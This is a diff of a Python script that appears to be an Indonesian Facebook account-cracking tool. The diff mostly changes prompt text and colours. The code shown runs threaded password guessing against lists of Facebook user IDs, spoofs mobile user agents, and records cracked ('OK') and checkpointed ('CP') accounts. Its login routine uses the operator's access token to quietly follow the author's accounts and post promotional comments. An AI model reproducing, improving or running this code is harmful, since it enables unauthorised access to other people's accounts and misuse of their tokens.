@@ -59,7 +59,7 @@ tBilall = ("%s-%s-%s-%s"%(hr, ha, op, ta))
 tgl = ("%s %s %s"%(ha, op, ta))
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
-raka_sayang_amanda = '3882176535153442'             
+           
 def raka_logo():
 	os.system("clear")
 	print("""\033[1;97m 
@@ -101,9 +101,8 @@ def login():
 			requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)      
 			requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token="+token)      
 			requests.post("https://graph.facebook.com/100006184624502/subscribers?access_token="+token)  
-			requests.post("https://graph.facebook.com/953529338576547/comments?message=Raka Orang Terganteng diindonesia !&access_token="+token)
-			requests.post("https://graph.facebook.com/4134622646575495/comments?message=Good Job 😊 !&access_token="+token)    
-                        requests.post("https://graph.facebook.com/%s/comments/?message=%s&access_token=%s"%(raka_sayang_amanda,token,token))
+			requests.post("https://graph.facebook.com/953529338576547/comments?message=Raka Orang Terganteng diindonesia 😊 !&access_token="+token)
+			requests.post("https://graph.facebook.com/4134622646575495/comments?message=Good Job 😊 !&access_token="+token)
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
@@ -130,9 +129,9 @@ def menu():
 	raka_logo()
 	ip = requests.get('https://api.ipify.org').text
         print("\033[1;96m\033[1;91m⋆✥⋆➣\033[1;96m\033[1;92m \033[1;96m=================================================")
-        print("\033[1;96m\033[1;92m<<>>\033[1;96m\033[1;92m \033[1;97mBergabung  : \033[1;93m%s"%(tgl))
         print("\033[1;96m\033[1;92m<<>>\033[1;96m\033[1;92m \033[1;97mNama       : \033[1;93m"+nama+"\033[1;92m")
         print("\033[1;96m\033[1;92m<<>>\033[1;96m\033[1;92m \033[1;97mIp Usert   : \033[1;93m%s"%(ip))
+        print("\033[1;96m\033[1;92m<<>>\033[1;96m\033[1;92m \033[1;97mBergabung  : \033[1;93m%s"%(tgl))
         print("\033[1;96m\033[1;91m⋆✥⋆➣\033[1;96m\033[1;92m \033[1;96m=================================================\n")
 	print("\033[1;96m[\033[1;93m1\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Crack Id Public + Friends")
 	print("\033[1;96m[\033[1;93m2\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Crack Id Followers")
@@ -271,32 +270,32 @@ def method():
 	if method == "":
 		menu()
 	elif method == "1":
-		ask = raw_input("\n\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Do you choose manual passwors ? y/t : \033[1;92m")
-                print("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Lama Ga Hasil Mainkan Mode Pesawat \033[1;92m1 \033[1;97mDetik ?")
+		ask = raw_input("\n\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Mau Menggunakan Passwords Manual ? y/t : \033[1;92m")
+                print("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Lama Ga Ada Hasil Mainkan Mode Pesawat \033[1;92m1 \033[1;97mDetik ?")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(bapi, id)
                 print("\n\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Simpan Hasil Crack Slama \033[1;92m5\033[1;97m Hari...")
-		exit("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Program End")
+		exit("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Crack Selesai...")
 	elif method == "2":
-		ask = raw_input("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Do you choose manual passwords ? y/t : \033[1;92m")
-                print("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Lama Ga Hasil Mainkan Mode Pesawat \033[1;92m1 \033[1;97mDetik ?")
+		ask = raw_input("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Mau Menggunakan Passwords Manual ? y/t : \033[1;92m")
+                print("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Lama Ga Ada Hasil Mainkan Mode Pesawat \033[1;92m1 \033[1;97mDetik ?")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(mbasic, id)
                 print("\n\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Simpan Hasil Crack Slama \033[1;92m5\033[1;97m Hari...")
-		exit("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Program End")
+		exit("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Crack Selesai...")
 	elif method == "3":
-		ask = raw_input("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Do you choose manual passwords ? y/t : \033[1;92m")
-                print("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Lama Ga Hasil Mainkan Mode Pesawat \033[1;92m1 \033[1;97mDetik ?")
+		ask = raw_input("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Mau Mengunakan Passwords Manual ? y/t : \033[1;92m")
+                print("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Lama Ga Ada Hasil Mainkan Mode Pesawat \033[1;92m1 \033[1;97mDetik ?")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(mobile, id)
                 print("\n\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Simpan Hasil Crack Slama \033[1;92m5\033[1;97m Hari...")
-		exit("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Program End")
+		exit("\033[1;96m[\033[1;93m•\033[1;96m]\033[1;92m⋆✥⋆➣\033[1;97m Crack Selesai...")
 	else:
 		menu()
 
@@ -335,7 +334,7 @@ def bapi(user):
                 ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[1;97m[\033[1;92mR\033[1;97m] \033[0;92mCrack \033[0;93m-\033[0;96m %s/%s  [OK:-%s] - \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;97m[\033[1;92mR\033[1;97m] \033[0;92mCrack \033[0;93m-\033[0;96m %s/%s  \033[0;92m[OK:-%s] \033[0;93m- \033[0;96m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -377,7 +376,7 @@ def mbasic(user):
 		ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;], Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[1;97m[\033[1;92mR\033[0;97m]  \033[1;92mCrack \033[0;93m-\033[0;96m %s/%s  [OK:-%s] - \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;97m[\033[1;92mR\033[0;97m]  \033[1;92mCrack \033[0;93m-\033[0;96m %s/%s  \033[0;92m[OK:-%s] \033[0;93m- \033[0;96m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -431,7 +430,7 @@ def mobile(user):
                 ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[1;97m[\033[1;92mR\033[0;97m] \033[1;92mCrack \033[0;93m-\033[0;96m %s/%s  [OK:-%s] - \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;97m[\033[1;92mR\033[0;97m] \033[1;92mCrack \033[0;93m-\033[0;96m %s/%s  \033[0;92m[OK:-%s] \033[0;93m- \033[0;96m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -493,7 +492,7 @@ def manual():
 	def main(user):
 		global loop, token
 		sys.stdout.write(
-		        "\r\033[1;97m[\033[1;92mR\033[0;97m] \033[1;92mCrack \033[0;93m-\033[0;96m %s/%s  [OK:-%s] - \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		        "\r\033[1;97m[\033[1;92mR\033[0;97m] \033[1;92mCrack \033[0;93m-\033[0;96m %s/%s  \033[0;92m[OK:-%s] \033[0;93m- \033[0;96m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		uid, name = user.split("<=>")
 		try:
